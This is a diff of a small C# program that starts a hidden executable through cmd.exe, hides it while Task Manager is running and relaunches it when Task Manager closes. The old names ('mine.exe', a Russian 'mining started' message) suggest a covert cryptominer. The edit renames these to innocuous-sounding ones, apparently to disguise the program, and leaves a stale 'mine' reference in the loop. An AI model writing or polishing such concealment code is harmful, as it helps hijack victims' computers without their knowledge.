@@ -6,7 +6,7 @@ using System.Threading;
 
 Process myProcess = new Process();
 myProcess.StartInfo.FileName = "cmd.exe";
-myProcess.StartInfo.Arguments = $@"/C cd {Directory.GetParent(Directory.GetCurrentDirectory())} & mine.exe";
+myProcess.StartInfo.Arguments = $@"/C cd {Directory.GetParent(Directory.GetCurrentDirectory())} & do.exe";
 myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
 myProcess.StartInfo.CreateNoWindow = true;
 
@@ -17,7 +17,7 @@ void search()
     while (true)
     {
         Process[] disp = Process.GetProcessesByName("Taskmgr");
-        Process[] mine = Process.GetProcessesByName("mine");
+        Process[] doing = Process.GetProcessesByName("do");
         if (disp.Length > 0)
         {
             foreach (Process proc in mine)
@@ -27,10 +27,10 @@ void search()
                 Thread.Sleep(1000);
             }
         }
-        else if (mine.Length == 0)
+        else if (doing.Length == 0)
         {
             myProcess.Start();
-            Console.WriteLine("Майн пшел");
+            Console.WriteLine("Begin");
             Thread.Sleep(1000);
         }
     }
